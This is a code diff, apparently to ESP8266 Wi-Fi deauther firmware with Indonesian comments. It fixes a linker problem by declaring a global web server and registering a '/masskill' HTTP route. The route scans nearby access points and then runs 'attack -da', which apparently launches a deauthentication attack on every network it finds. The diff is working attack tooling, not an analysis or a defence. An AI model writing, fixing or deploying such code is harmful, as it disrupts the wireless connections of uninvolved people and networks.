@@ -43,6 +43,9 @@ simplebutton::Button* resetButton;
 
 #include "wifi.h"
 
+// JURUS PAMUNGKAS: Deklarasi variabel server secara langsung sebagai extern global
+extern ESP8266WebServer server;
+
 uint32_t autosaveTime = 0;
 uint32_t currentTime  = 0;
 unsigned long resume_attack = 0;
@@ -128,23 +131,20 @@ void setup() {
         Serial.end();
     }
 
-    // --- FIX FINAL ANTI-LINKER ERROR ---
+    // --- PERBAIKAN MASS KILL ---
     if (settings::getWebSettings().enabled) {
         wifi::startAP();
         
-        // Memanggil pointer server melalui fungsi publik wifi::getWebServer()
-        ESP8266WebServer* s = wifi::getWebServer(); 
-        
-        if(s) {
-            s->on("/masskill", [s]() {
-                attack.stop();
-                scan.stop();
-                accesspoints.removeAll();
-                cli.runCommand("scan aps -t 15s"); //
-                cli.runCommand("attack -da");      //
-                s->send(200, "text/plain", "OK");
-            });
-        }
+        // Panggil server langsung tanpa namespace 'wifi'
+        // Gunakan [&] untuk menangkap referensi server global secara otomatis
+        server.on("/masskill", [&]() {
+            attack.stop();
+            scan.stop();
+            accesspoints.removeAll();
+            cli.runCommand("scan aps -t 15s"); 
+            cli.runCommand("attack -da");      
+            server.send(200, "text/plain", "OK");
+        });
     }
 
     prntln(SETUP_STARTED);
